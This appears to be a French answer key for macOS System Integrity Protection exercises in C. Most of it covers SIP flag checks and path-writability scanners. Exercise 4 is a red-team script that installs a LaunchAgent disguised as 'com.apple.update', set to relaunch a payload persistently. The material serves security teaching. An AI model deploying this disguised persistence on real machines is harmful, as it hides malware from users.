# Solutions - System Integrity Protection (SIP)

## Exercice 1 : Vérifier l'État de SIP

### Solution Complète

```c
#include <stdio.h>
#include <sys/csr.h>

int main() {
    printf("[*] Checking SIP status...\n\n");

    // Vérifier le statut global de SIP
    // csr_check() retourne 0 si le flag est DÉSACTIVÉ
    if (csr_check(CSR_ALLOW_UNRESTRICTED_FS) == 0) {
        printf("SIP Filesystem Protection: DISABLED\n");
        printf("System Integrity Protection: DISABLED\n");
    } else {
        printf("SIP Filesystem Protection: ENABLED\n");
        printf("System Integrity Protection: ENABLED\n");
    }

    return 0;
}
```

### Explication

- `csr_check()` retourne `0` si la protection est **désactivée**
- `csr_check()` retourne **non-zéro** si la protection est **activée**
- C'est contre-intuitif mais important à retenir !

---

## Exercice 2 : Test des Chemins Protégés

### Solution Complète

```c
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

void test_path(const char *path) {
    // Tenter d'ouvrir en écriture
    int fd = open(path, O_WRONLY | O_CREAT | O_EXCL, 0644);

    if (fd == -1) {
        // Échec : vérifier la raison
        if (errno == EACCES || errno == EPERM || errno == EROFS) {
            printf("%-30s : PROTECTED\n", path);
        } else if (errno == EEXIST) {
            printf("%-30s : EXISTS (can't test)\n", path);
        } else {
            printf("%-30s : ERROR (%s)\n", path, strerror(errno));
        }
    } else {
        // Succès : le chemin est accessible
        printf("%-30s : WRITABLE\n", path);
        close(fd);
        unlink(path);  // Nettoyer le fichier de test
    }
}

int main() {
    printf("[*] Testing SIP-protected paths:\n\n");

    test_path("/System/test.txt");
    test_path("/usr/bin/test.txt");
    test_path("/usr/local/test.txt");
    test_path("/tmp/test.txt");

    return 0;
}
```

### Résultat Attendu

```
[*] Testing SIP-protected paths:

/System/test.txt           : PROTECTED
/usr/bin/test.txt          : PROTECTED
/usr/local/test.txt        : WRITABLE
/tmp/test.txt              : WRITABLE
```

---

## Exercice 3 : SIP Scanner Complet

### Solution Complète

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/csr.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#define RED     "\x1b[31m"
#define GREEN   "\x1b[32m"
#define YELLOW  "\x1b[33m"
#define RESET   "\x1b[0m"

typedef struct {
    uint32_t flag;
    const char *name;
} CSRFlag;

int check_csr_flag(uint32_t flag, const char *name) {
    if (csr_check(flag) == 0) {
        printf("  " RED "[!]" RESET " %-35s DISABLED\n", name);
        return 0;
    } else {
        printf("  " GREEN "[+]" RESET " %-35s ENABLED\n", name);
        return 1;
    }
}

void test_path(const char *path, int *protected_count, int *writable_count) {
    int fd = open(path, O_WRONLY | O_CREAT | O_EXCL, 0644);

    if (fd == -1) {
        if (errno == EACCES || errno == EPERM || errno == EROFS) {
            printf("  " GREEN "[+]" RESET " %-40s PROTECTED\n", path);
            (*protected_count)++;
        }
    } else {
        printf("  " RED "[!]" RESET " %-40s WRITABLE\n", path);
        (*writable_count)++;
        close(fd);
        unlink(path);
    }
}

int main() {
    printf("╔═══════════════════════════════════════╗\n");
    printf("║     macOS SIP Scanner v1.0            ║\n");
    printf("╚═══════════════════════════════════════╝\n\n");

    // Phase 1: Vérifier les flags
    printf(YELLOW "[*]" RESET " Checking CSR flags:\n\n");

    CSRFlag flags[] = {
        {CSR_ALLOW_UNTRUSTED_KEXTS, "KEXT Loading Protection"},
        {CSR_ALLOW_UNRESTRICTED_FS, "Filesystem Protection"},
        {CSR_ALLOW_TASK_FOR_PID, "task_for_pid() Protection"},
        {CSR_ALLOW_KERNEL_DEBUGGER, "Kernel Debugger Protection"},
        {CSR_ALLOW_UNRESTRICTED_DTRACE, "DTrace Protection"},
        {CSR_ALLOW_UNRESTRICTED_NVRAM, "NVRAM Protection"},
        {0, NULL}
    };

    int total_flags = 0;
    int enabled_flags = 0;

    for (int i = 0; flags[i].name != NULL; i++) {
        total_flags++;
        enabled_flags += check_csr_flag(flags[i].flag, flags[i].name);
    }

    // Phase 2: Tester les chemins
    printf("\n" YELLOW "[*]" RESET " Testing filesystem paths:\n\n");

    const char *paths[] = {
        "/System/test", "/usr/bin/test", "/usr/lib/test",
        "/sbin/test", "/bin/test",
        "/usr/local/bin/test", "/tmp/test", "/var/tmp/test",
        "/Applications/test", "/Library/test",
        NULL
    };

    int protected_count = 0;
    int writable_count = 0;

    for (int i = 0; paths[i] != NULL; i++) {
        test_path(paths[i], &protected_count, &writable_count);
    }

    // Phase 3: Rapport final
    printf("\n╔═══════════════════════════════════════╗\n");
    printf("║          Security Report              ║\n");
    printf("╚═══════════════════════════════════════╝\n\n");

    int security_score = (enabled_flags * 100) / total_flags;

    printf("  CSR Flags Enabled:     %d/%d (%.1f%%)\n",
           enabled_flags, total_flags, (enabled_flags * 100.0) / total_flags);
    printf("  Protected Paths:       %d\n", protected_count);
    printf("  Writable Paths:        %d\n", writable_count);
    printf("\n  Overall Security Score: ");

    if (security_score >= 80) {
        printf(GREEN "%d/100" RESET " (GOOD)\n", security_score);
    } else if (security_score >= 50) {
        printf(YELLOW "%d/100" RESET " (MEDIUM)\n", security_score);
    } else {
        printf(RED "%d/100" RESET " (WEAK)\n", security_score);
    }

    printf("\n");

    return 0;
}
```

---

## Exercice 4 : Simulation d'Attaque

### Solution Complète

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/csr.h>
#include <fcntl.h>
#include <errno.h>
#include <pwd.h>

typedef struct {
    int sip_enabled;
    int filesystem_protected;
    int kext_protected;
    char writable_paths[10][256];
    int num_writable;
} ReconReport;

ReconReport perform_reconnaissance() {
    ReconReport report = {0};

    // Vérifier SIP
    if (csr_check(CSR_ALLOW_UNRESTRICTED_FS) != 0) {
        report.sip_enabled = 1;
        report.filesystem_protected = 1;
    }

    if (csr_check(CSR_ALLOW_UNTRUSTED_KEXTS) != 0) {
        report.kext_protected = 1;
    }

    // Identifier chemins writables
    const char *test_paths[] = {
        "/usr/local/bin",
        "/tmp",
        "/var/tmp",
        NULL
    };

    for (int i = 0; test_paths[i] != NULL && report.num_writable < 10; i++) {
        char test_file[512];
        snprintf(test_file, sizeof(test_file), "%s/test_%d", test_paths[i], getpid());

        int fd = open(test_file, O_WRONLY | O_CREAT | O_EXCL, 0644);
        if (fd != -1) {
            close(fd);
            unlink(test_file);
            strcpy(report.writable_paths[report.num_writable], test_paths[i]);
            report.num_writable++;
        }
    }

    // Ajouter le home directory de l'utilisateur
    struct passwd *pw = getpwuid(getuid());
    if (pw != NULL && report.num_writable < 10) {
        snprintf(report.writable_paths[report.num_writable], 256,
                 "%s/Library/LaunchAgents", pw->pw_dir);
        report.num_writable++;
    }

    return report;
}

int create_persistence(const char *payload_path) {
    struct passwd *pw = getpwuid(getuid());
    if (pw == NULL) {
        fprintf(stderr, "[!] Could not get user info\n");
        return -1;
    }

    // Chemin vers LaunchAgent
    char plist_path[512];
    snprintf(plist_path, sizeof(plist_path),
             "%s/Library/LaunchAgents/com.apple.update.plist", pw->pw_dir);

    // Créer le répertoire si nécessaire
    char launchagents_dir[512];
    snprintf(launchagents_dir, sizeof(launchagents_dir),
             "%s/Library/LaunchAgents", pw->pw_dir);

    // Créer le plist
    FILE *f = fopen(plist_path, "w");
    if (f == NULL) {
        fprintf(stderr, "[!] Could not create plist: %s\n", strerror(errno));
        return -1;
    }

    fprintf(f, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
    fprintf(f, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
    fprintf(f, "<plist version=\"1.0\">\n");
    fprintf(f, "<dict>\n");
    fprintf(f, "    <key>Label</key>\n");
    fprintf(f, "    <string>com.apple.update</string>\n");
    fprintf(f, "    <key>ProgramArguments</key>\n");
    fprintf(f, "    <array>\n");
    fprintf(f, "        <string>%s</string>\n", payload_path);
    fprintf(f, "    </array>\n");
    fprintf(f, "    <key>RunAtLoad</key>\n");
    fprintf(f, "    <true/>\n");
    fprintf(f, "    <key>KeepAlive</key>\n");
    fprintf(f, "    <true/>\n");
    fprintf(f, "</dict>\n");
    fprintf(f, "</plist>\n");

    fclose(f);

    printf("[+] Created LaunchAgent: %s\n", plist_path);
    return 0;
}

void print_json_report(ReconReport *report) {
    time_t now = time(NULL);
    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    printf("{\n");
    printf("  \"timestamp\": %ld,\n", now);
    printf("  \"hostname\": \"%s\",\n", hostname);
    printf("  \"sip\": {\n");
    printf("    \"enabled\": %s,\n", report->sip_enabled ? "true" : "false");
    printf("    \"flags\": {\n");
    printf("      \"filesystem\": %s,\n", report->filesystem_protected ? "true" : "false");
    printf("      \"kext\": %s\n", report->kext_protected ? "true" : "false");
    printf("    }\n");
    printf("  },\n");
    printf("  \"writable_paths\": [\n");
    for (int i = 0; i < report->num_writable; i++) {
        printf("    \"%s\"%s\n", report->writable_paths[i],
               i < report->num_writable - 1 ? "," : "");
    }
    printf("  ]\n");
    printf("}\n");
}

int main() {
    printf("[*] Starting macOS Red Team Recon...\n\n");

    ReconReport report = perform_reconnaissance();

    if (!report.sip_enabled) {
        printf("[!] SIP DISABLED - Full system access possible!\n");
    } else {
        printf("[+] SIP ENABLED - Using alternative persistence...\n");
        create_persistence("/usr/local/bin/payload");
    }

    printf("\n[*] JSON Report:\n\n");
    print_json_report(&report);

    printf("\n[+] Recon complete.\n");
    return 0;
}
```

---

## Résumé des Concepts Clés

### 1. API SIP

```c
#include <sys/csr.h>

// Retourne 0 si DÉSACTIVÉ, non-0 si ACTIVÉ
int csr_check(uint32_t flag);
```

### 2. Flags Importants

| Flag | Description |
|------|-------------|
| `CSR_ALLOW_UNRESTRICTED_FS` | Protection filesystem |
| `CSR_ALLOW_UNTRUSTED_KEXTS` | Protection KEXT |
| `CSR_ALLOW_TASK_FOR_PID` | Protection task_for_pid() |

### 3. Chemins Protégés vs Non-Protégés

**Protégés** :
- `/System/`
- `/usr/bin/`, `/usr/lib/`, `/usr/sbin/`
- `/bin/`, `/sbin/`

**Non-Protégés** :
- `/usr/local/`
- `/tmp/`, `/var/tmp/`
- `~/Library/`
- `/Applications/` (apps tierces)

### 4. Stratégies Red Team

1. **Reconnaissance** : Vérifier l'état de SIP
2. **Adaptation** : Utiliser chemins non-protégés
3. **Persistence** : LaunchAgents utilisateur
4. **OPSEC** : Éviter /System/, ne pas tenter de bypass

---

## Compilation et Tests

```bash
# Exercice 1
clang ex1.c -o ex1 && ./ex1

# Exercice 2
clang ex2.c -o ex2 && ./ex2

# Exercice 3
clang ex3.c -o ex3 && ./ex3

# Exercice 4
clang ex4.c -o ex4 && ./ex4
```
